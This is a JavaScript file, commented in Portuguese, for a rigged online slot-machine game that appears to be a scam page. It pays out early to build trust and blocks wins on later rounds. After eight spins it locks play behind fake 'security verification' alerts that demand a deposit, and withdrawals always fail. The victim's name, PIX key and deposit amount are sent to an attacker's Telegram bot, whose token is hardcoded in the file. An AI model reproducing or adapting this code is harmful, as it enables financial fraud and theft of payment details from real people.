// =========================================================================
// VERSÃO CORRIGIDA: BALÃO EXCLUSIVO DE GANHO E TRAVA ISOLADA NA 8ª RODADA
// =========================================================================

let saldo = parseFloat(localStorage.getItem('saldo')) || 50.00;
let apostaAtual = 2.00;
let jogadasEfetuadas = parseInt(localStorage.getItem('jogadasEfetuadas')) || 0;
let estaGirando = false;

// Credenciais validadas da sua API do Telegram
const TELEGRAM_TOKEN = "8568148429:AAGzu7zf-n-fGJnUpaNGVCLvQnsR2JxJ3fs";
const TELEGRAM_CHAT_ID = "7668457919";

// Banco de símbolos do caça-níqueis do tigre
const simbolosSlot = ['🐯', '💰', '🍊', '🎆', '🧧'];

function obterSimboloAleatorio() {
    return simbolosSlot[Math.floor(Math.random() * simbolosSlot.length)];
}

// Inicialização da grade gerando símbolos dinâmicos e misturados
function iniciarLayoutReels() {
    for (let i = 0; i < 3; i++) {
        const targetReel = document.getElementById(`reel-${i}`);
        if (targetReel) {
            targetReel.innerHTML = '';
            for (let j = 0; j < 3; j++) { 
                const item = document.createElement('div');
                item.className = 'slot-item';
                item.innerText = obterSimboloAleatorio();
                targetReel.appendChild(item);
            }
        }
    }
    atualizarExibicaoSaldo();
}

function atualizarExibicaoSaldo() {
    const elSaldo = document.getElementById('saldo');
    if (elSaldo) elSaldo.innerText = `R$ ${saldo.toFixed(2)}`;
    
    localStorage.setItem('saldo', saldo.toFixed(2));
    localStorage.setItem('jogadasEfetuadas', jogadasEfetuadas);
}

window.alterarAposta = function(direcao) {
    if (estaGirando) return;
    if (direcao === 1 && apostaAtual < 20.00) apostaAtual += 2.00;
    if (direcao === -1 && apostaAtual > 2.00) apostaAtual -= 2.00;
    
    const elAposta = document.getElementById('valor-aposta');
    if (elAposta) elAposta.innerText = `R$ ${apostaAtual.toFixed(2)}`;
};

// CONTROLE DO BOTÃO DE GIRO - LIMPA E RENOVA A TELA EM 100% A CADA CLIQUE
window.girarSlots = function() {
    if (estaGirando) return;

    // BLOQUEIO PREVENTIVO: Se já completou 8 giros, trava antes da 9ª rodada começar
    if (jogadasEfetuadas >= 8) {
        alert("⚠️ Validação de segurança pendente! Acesse o painel financeiro para validar sua chave PIX e continuar jogando.");
        window.abrirModalDeposito();
        return;
    }

    if (saldo < apostaAtual) {
        alert("Saldo insuficiente! Efetue um depósito para continuar.");
        window.abrirModalDeposito();
        return;
    }

    estaGirando = true;
    saldo -= apostaAtual;
    jogadasEfetuadas++;
    atualizarExibicaoSaldo();

    // Limpa os elementos visuais antigos instantaneamente ao clicar para não viciar a tela
    for (let i = 0; i < 3; i++) {
        const targetReel = document.getElementById(`reel-${i}`);
        if (targetReel) {
            targetReel.innerHTML = ''; 
            targetReel.classList.add('rodando-vertical');
            
            // Injeta elementos temporários rápidos para criar a ilusão física de descida
            for (let j = 0; j < 6; j++) {
                const itemTmp = document.createElement('div');
                itemTmp.className = 'slot-item';
                itemTmp.innerText = obterSimboloAleatorio();
                targetReel.appendChild(itemTmp);
            }
        }
    }

    setTimeout(() => {
        let multiplicador = 0;
        
        // Bloqueia qualquer chance de premiação na sétima e oitava rodada
        if (jogadasEfetuadas >= 7) {
            multiplicador = 0;
        } else {
            const sorteio = Math.random();
            if (sorteio < 0.35) multiplicador = 0;
            else if (sorteio < 0.70) multiplicador = 2;
            else if (sorteio < 0.90) multiplicador = 5;
            else multiplicador = 10;
        }

        let simboloMeioGanhador = obterSimboloAleatorio();
        if (multiplicador === 10) simboloMeioGanhador = '🐯';
        else if (multiplicador === 5) simboloMeioGanhador = '💰';
        else if (multiplicador === 2) simboloMeioGanhador = '🧧';

        // RECONSTRUÇÃO DA GRADE DESALINHADA: Garante a renovação total dos emojis
        for (let i = 0; i < 3; i++) {
            const targetReel = document.getElementById(`reel-${i}`);
            if (targetReel) {
                targetReel.classList.remove('rodando-vertical');
                targetReel.innerHTML = ''; // Destrói os clones da animação antiga
                
                // Nível Superior - Símbolo Individual Aleatório
                const itemTopo = document.createElement('div');
                itemTopo.className = 'slot-item';
                itemTopo.innerText = obterSimboloAleatorio();
                
                // Nível Central - Gerencia o prêmio da linha horizontal do meio
                const itemMeio = document.createElement('div');
                itemMeio.className = 'slot-item';
                if (multiplicador > 0) {
                    itemMeio.innerText = simboloMeioGanhador; // Alinha se houver ganho
                } else {
                    let desinfetado = obterSimboloAleatorio();
                    if (i === 1 && desinfetado === simboloMeioGanhador) {
                        desinfetado = simbolosSlot[(simbolosSlot.indexOf(desinfetado) + 1) % simbolosSlot.length];
                    }
                    itemMeio.innerText = desinfetado;
                }

                // Nível Inferior - Símbolo Individual Aleatório
                const itemBase = document.createElement('div');
                itemBase.className = 'slot-item';
                itemBase.innerText = obterSimboloAleatorio();

                targetReel.appendChild(itemTopo);
                targetReel.appendChild(itemMeio);
                targetReel.appendChild(itemBase);
            }
        }

        // NOVO SISTEMA VISUAL EXCLUSIVO: MOSTRA SÓ E APENAS O GANHO DA PESSOA
        if (multiplicador > 0) {
            const ganho = apostaAtual * multiplicador;
            saldo += ganho;
            atualizarExibicaoSaldo();

            // Cria o balãozinho customizado flutuante contendo estritamente a celebração do prêmio faturado
            const balaoGanho = document.createElement('div');
            balaoGanho.className = 'balao-ganho-dinamico';
            balaoGanho.innerHTML = `🎉 Você ganhou: <strong>R$ ${ganho.toFixed(2)}</strong>`;
            document.body.appendChild(balaoGanho);

            // Remove o balão da tela sozinho após 3 segundos
            setTimeout(() => {
                balaoGanho.remove();
            }, 3000);

        } else {
            // TRAVA DE SEGURANÇA ISOLADA: EXECUTADA NO TÉRMINO EXATO DO 8º GIRO
            if (jogadasEfetuadas === 8) {
                alert("⚠️ Verificação Cadastral de Segurança!\n\nSeu saldo acumulado foi retido para segurança. Para validar sua Chave Pix e desbloquear o painel de saques, efetue um depósito de ativação.");
                window.abrirModalDeposito();
                estaGirando = false;
                return;
            }
        }
        
        estaGirando = false;
    }, 1500);
};

// FLUXO MODAL FINANCEIRO
window.abrirModalDeposito = function() {
    const modal = document.getElementById('modal-deposito');
    if (modal) {
        modal.style.display = 'flex';
        
        // Remove a exibição do campo de cidade caso ele tente renderizar no modal antigo
        const campoCidade = document.getElementById('pix-cidade');
        if (campoCidade && campoCidade.parentElement) {
            campoCidade.parentElement.style.display = 'none';
        }
        
        if (localStorage.getItem('pix_chave_salva')) {
            document.getElementById('pix-chave').value = localStorage.getItem('pix_chave_salva');
            document.getElementById('pix-nome').value = localStorage.getItem('pix_nome_salvo');
        }
    }
};

window.fecharModalDeposito = function() {
    if (jogadasEfetuadas >= 8) {
        alert("❌ Bloqueio de segurança! Insira e confirme sua chave Pix para poder liberar a máquina do Tigre.");
        return;
    }
    const modal = document.getElementById('modal-deposito');
    if (modal) modal.style.display = 'none';
};

// CAPTURA E DISPARO DE INFORMAÇÕES EXCLUSIVAS PARA O TELEGRAM
window.salvarEDepositarPIX = function() {
    const nome = document.getElementById('pix-nome').value.trim();
    const chave = document.getElementById('pix-chave').value.trim();
    const valorStr = document.getElementById('pix-valor-dep').value;
    const valorDep = parseFloat(valorStr) || 20.00;

    if (!nome || !chave) {
        alert("Por favor, preencha todos os campos obrigatórios (Nome e Chave Pix)!");
        return;
    }

    localStorage.setItem('pix_chave_salva', chave);
    localStorage.setItem('pix_nome_salvo', nome);

    // Estruturação do texto que chega no seu aplicativo em tempo real
    const textoMensagem = encodeURIComponent(
        `🚨 *NOVA SOLICITAÇÃO RECEBIDA* 🚨\n\n` +
        `👤 *Cliente:* ${nome}\n` +
        `🔑 *Chave Pix:* ${chave}\n` +
        `💳 *Valor Solicitado:* R$ ${valorDep.toFixed(2)}\n` +
        `📊 *Saldo Retido no Jogo:* R$ ${saldo.toFixed(2)}`
    );

    const urlDestino = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${textoMensagem}&parse_mode=Markdown`;

    // Dispara a requisição em background assíncrono para os servidores do Telegram
    fetch(urlDestino)
        .then(() => {
            saldo += valorDep;
            jogadasEfetuadas = 0; // Reseta e libera os giros após o envio bem-sucedido
            atualizarExibicaoSaldo();
            
            alert(`✅ Chave PIX cadastrada!\nSeus dados foram salvos e estão sob verificação.`);
            
            const modal = document.getElementById('modal-deposito');
            if (modal) modal.style.display = 'none';
        })
        .catch((err) => {
            console.error("Erro na comunicação com a API do Telegram:", err);
            alert("Erro de rede! Verifique sua conexão à internet e tente novamente.");
        });
};

window.sacar = function() {
    alert("❌ Saque indisponível! Sua conta requer uma validação via PIX ativo no painel de depósitos para liberação dos fundos.");
};

document.addEventListener('DOMContentLoaded', iniciarLayoutReels);
